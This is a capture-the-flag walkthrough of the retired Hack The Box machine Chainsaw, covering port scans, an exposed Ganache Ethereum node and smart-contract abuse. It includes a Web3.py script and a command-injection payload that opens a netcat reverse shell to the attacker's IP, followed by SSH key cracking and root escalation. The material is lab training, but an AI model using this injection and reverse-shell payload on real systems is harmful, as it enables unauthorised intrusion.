---
layout: post
title: "Chainsaw: Hack The Box Walkthrough"
date: 2019-11-24 07:16:32 +0000
last_modified_at: 2019-11-24 07:16:32 +0000
category: Walkthrough
tags: ["Hack The Box", Chainsaw, retired]
comments: true
image:
  feature: chainsaw-htb-walkthrough.jpg
  credit: fotoblend / Pixabay
  creditlink: https://pixabay.com/photos/chain-saw-chainsaw-dangerous-sharp-4192114/
---

This post documents the complete walkthrough of Chainsaw, a retired vulnerable [VM][1] created by [artikrh][2] and [absolutezero][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Chainsaw is retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.142 --rate=1000              

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-06-19 01:43:05 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 9810/tcp on 10.10.10.142
Discovered open port 21/tcp on 10.10.10.142
Discovered open port 22/tcp on 10.10.10.142
```

`9810/tcp` sure looks interesting. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p21,22,9810 -A --reason -oN nmap.txt 10.10.10.142
...
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json
| -rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol
|_-rw-r--r--    1 1001     1001           44 Jun 18 20:49 address.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.122
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.7p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 02:dd:8a:5d:3c:78:d4:41:ff:bb:27:39:c1:a2:4f:eb (RSA)
|   256 3d:71:ff:d7:29:d5:d4:b2:a6:4f:9d:eb:91:1b:70:9f (ECDSA)
|_  256 7e:02:da:db:29:f9:d2:04:63:df:fc:91:fd:a2:5a:f2 (ED25519)
9810/tcp open  unknown syn-ack ttl 63
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 400 Bad Request
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Wed, 19 Jun 2019 01:48:39 GMT
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.1 400 Bad Request
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Wed, 19 Jun 2019 01:48:32 GMT
|     Connection: close
|     Request
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Wed, 19 Jun 2019 01:48:33 GMT
|_    Connection: close
```

Hmm. No luck with `9810/tcp`. What the heck, since anonymous FTP is available, we'll go with that first.

### Anonymous FTP

There are three files in there. Let's grab all of them.

<a class="image-popup">
![879b18cc.png](/assets/images/posts/chainsaw-htb-walkthrough/879b18cc.png)
</a>

<div class="filename"><span>WeaponizedPing.sol</span></div>

~~~~
pragma solidity ^0.4.24;

contract WeaponizedPing
{
  string store = "google.com";

  function getDomain() public view returns (string)
  {
      return store;
  }

  function setDomain(string _value) public
  {
      store = _value;
  }
}
~~~~

Turns out that `WeaponizedPing.sol `is a [smart contract](https://en.wikipedia.org/wiki/Smart_contract) written in [Solidity](https://en.wikipedia.org/wiki/Solidity). [Ethereum](https://en.wikipedia.org/wiki/Ethereum) huh...

### Ganache CLI

Despite not knowing anything about Ethereum, I was able to tease out the fact that `9810/tcp` was running Ganache CLI.

```
# printf "$(curl -s -H "Content-Type: application/json" -d '{}' http://10.10.10.142:9810 | jq . | sed '6!d' | cut -d':' -f2- | sed -e 's/ "//' -e 's/",//')\n"
Error: Method undefined not supported.
    at GethApiDouble.handleRequest (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/lib/subproviders/geth_api_double.js:66:16)
    at next (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/index.js:116:18)
    at GethDefaults.handleRequest (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/lib/subproviders/gethdefaults.js:15:12)
    at next (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/index.js:116:18)
    at SubscriptionSubprovider.FilterSubprovider.handleRequest (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/subproviders/filters.js:89:7)
    at SubscriptionSubprovider.handleRequest (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/subproviders/subscriptions.js:136:49)
    at next (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/index.js:116:18)
    at DelayedBlockFilter.handleRequest (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/lib/subproviders/delayedblockfilter.js:31:3)
    at next (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/index.js:116:18)
    at RequestFunnel.handleRequest (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/lib/subproviders/requestfunnel.js:32:12)
    at next (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/index.js:116:18)
    at Web3ProviderEngine._handleAsync (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/index.js:103:3)
    at Timeout._onTimeout (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/index.js:87:12)
    at ontimeout (timers.js:498:11)
    at tryOnTimeout (timers.js:323:5)
    at Timer.listOnTimeout (timers.js:290:5)
```

According to its GitHub [repository](https://github.com/trufflesuite/ganache),

> Ganache is your personal blockchain for Ethereum development.

After some reading and research, I got to know that `ganache-cli`, by default, automatically creates 10 accounts associated with 10 private keys. Each account has 100 ethers for testing purpose. It also exposes the [JSON RPC API](https://github.com/ethereum/wiki/wiki/JSON-RPC).

### Gaining a Foothold

We need something to interact with the WeaponizedPing contract deployed in Ganache-CLI.

Enter [Web3.py](https://github.com/ethereum/web3.py).

Towards that end, I wrote the following Python script.

<div class="filename"><span>weapon.py</span></div>

~~~~python
#!/usr/bin/env python3

from web3 import Web3, HTTPProvider
import json, sys

contract_data = json.loads(open('WeaponizedPing.json').read())
contract_addr = open('address.txt').read().rstrip()

w3 = Web3(HTTPProvider('http://10.10.10.142:9810'))
account = w3.eth.coinbase

weapon = w3.eth.contract(address=contract_addr, abi=contract_data['abi'])
weapon.functions.setDomain(sys.argv[1]).transact({"from":account,"to":contract_addr})
weapon.functions.getDomain().call()
~~~~

To test it out, I set up `tcpdump` to listen on `tun0` for any ICMP traffic. In a separate terminal, run `./weapon.py <my_htb_ip>`.

<a class="image-popup">
![3ee3bf3f.png](/assets/images/posts/chainsaw-htb-walkthrough/3ee3bf3f.png)
</a>

Exactly one `ping` request is seen. I think I know what's going on here. Let's do it this way then.

```
# ./weapon.py '; nc 10.10.14.122 1234 -e /bin/bash'
```

<a class="image-popup">
![183b8df7.png](/assets/images/posts/chainsaw-htb-walkthrough/183b8df7.png)
</a>

Bam. A reverse shell appears!

## Low-Privilege Shell

Now that we have a low-privilege shell, it's time to find `user.txt`.

### Getting `user.txt`

If I have to guess, I would say that `user.txt` is in `bobby`'s home directory. Too bad I don't have access to it.

<a class="image-popup">
![d73f8a84.png](/assets/images/posts/chainsaw-htb-walkthrough/d73f8a84.png)
</a>

During enumeration of `administrator`'s account, I notice `pub` appears to be carrying all the SSH public keys belonging to `bobby` and the rest of the "users". They were apparently generated by `gen.py`, given that their last-modified dates were identical.

<a class="image-popup">
![96e36d39.png](/assets/images/posts/chainsaw-htb-walkthrough/96e36d39.png)
</a>

From the code of `gen.py`, I should have `bobby.key` (SSH private key) but it's nowhere to be found. It was at this moment, I saw `.ipfs` at `administrator`'s home directory.

<a class="image-popup">
![49668d8b.png](/assets/images/posts/chainsaw-htb-walkthrough/49668d8b.png)
</a>

I did a simple recursive `grep` for `bobby` and see what I found.

<a class="image-popup">
![bd5371c6.png](/assets/images/posts/chainsaw-htb-walkthrough/bd5371c6.png)
</a>

Jackpot! One of the `ipfs` blocks is holding an email with `bobby`'s private key as attachment.

<a class="image-popup">
![5c91b9b8.png](/assets/images/posts/chainsaw-htb-walkthrough/5c91b9b8.png)
</a>

Let's extract the email and see what it says.

<a class="image-popup">
![41cfa929.png](/assets/images/posts/chainsaw-htb-walkthrough/41cfa929.png)
</a>

Here's how `bobby.key` looks like.

<a class="image-popup">
![40e7ac8c.png](/assets/images/posts/chainsaw-htb-walkthrough/40e7ac8c.png)
</a>

Time to show John the Ripper some :heart:

<a class="image-popup">
![347106a0.png](/assets/images/posts/chainsaw-htb-walkthrough/347106a0.png)
</a>

The password is `jackychain`. Just as expected, `user.txt` is indeed in `bobby`'s home directory.

<a class="image-popup">
![f82b2e82.png](/assets/images/posts/chainsaw-htb-walkthrough/f82b2e82.png)
</a>

## Privilege Escalation

During enumeration of `bobby`'s account, I noticed something interesting.

### Getting `root.txt`

There's a `projects` directory in `bobby`'s home directory. It appears that there's another Ganache-CLI instance and we need to call another contract function as well.

<a class="image-popup">
![34a387c8.png](/assets/images/posts/chainsaw-htb-walkthrough/34a387c8.png)
</a>

```
pragma solidity ^0.4.22;

contract ChainsawClub {

  string username = 'nobody';
  string password = '7b455ca1ffcb9f3828cfdde4a396139e';
  bool approve = false;
  uint totalSupply = 1000;
  uint userBalance = 0;

  function getUsername() public view returns (string) {
      return username;
  }
  function setUsername(string _value) public {
      username = _value;
  }
  function getPassword() public view returns (string) {
      return password;
  }
  function setPassword(string _value) public {
      password = _value;
  }
  function getApprove() public view returns (bool) {
      return approve;
  }
  function setApprove(bool _value) public {
      approve = _value;
  }
  function getSupply() public view returns (uint) {
      return totalSupply;
  }
  function getBalance() public view returns (uint) {
      return userBalance;
  }
  function transfer(uint _value) public {
      if (_value > 0 && _value <= totalSupply) {
          totalSupply -= _value;
          userBalance += _value;
      }
  }
  function reset() public {
      username = '';
      password = '';
      userBalance = 0;
      totalSupply = 1000;
      approve = false;
  }
}
```

Let's use what we've learned from the previous contract and apply it.

<a class="image-popup">
![9e6c2e42.png](/assets/images/posts/chainsaw-htb-walkthrough/9e6c2e42.png)
</a>

Time to set a username and password I control, and see if I can bypass the `ChainsawClub` executable.

<a class="image-popup">
![16bcdc36.png](/assets/images/posts/chainsaw-htb-walkthrough/16bcdc36.png)
</a>

Suffice to say, I need to approve the user and supply some lubricants :wink:

<a class="image-popup">
![61e9148a.png](/assets/images/posts/chainsaw-htb-walkthrough/61e9148a.png)
</a>

I couldn't believe my eyes when I saw the `root` prompt. Good advice because if you go look for `root.txt`, this is what you see.

<a class="image-popup">
![e91f66a0.png](/assets/images/posts/chainsaw-htb-walkthrough/e91f66a0.png)
</a>

Damn. What does it even mean? I'm going to put on my forensics hat and take things one step at a time. First of all, `root.txt` was last modified on **Jan 23, 2019 at 0904hrs**.

<a class="image-popup">
![f818f665.png](/assets/images/posts/chainsaw-htb-walkthrough/f818f665.png)
</a>

Let's see what executables were accessed within that timestamp. We first create a last-accessed timestamp with `touch`.

```
touch -at "201901230904" /tmp/stamp
```

<a class="image-popup">
![651b8784.png](/assets/images/posts/chainsaw-htb-walkthrough/651b8784.png)
</a>

What's `bmap`? Googling for "bmap hide" brought me to this.

<a class="image-popup">
![5ed5ea69.png](/assets/images/posts/chainsaw-htb-walkthrough/5ed5ea69.png)
</a>

I see what's going on. The real `root` flag must be hidden in the slack space of `root.txt`.

<a class="image-popup">
![91d762c7.png](/assets/images/posts/chainsaw-htb-walkthrough/91d762c7.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/193
[2]: https://www.hackthebox.eu/home/users/profile/41600
[3]: https://www.hackthebox.eu/home/users/profile/37317
[4]: https://www.hackthebox.eu/
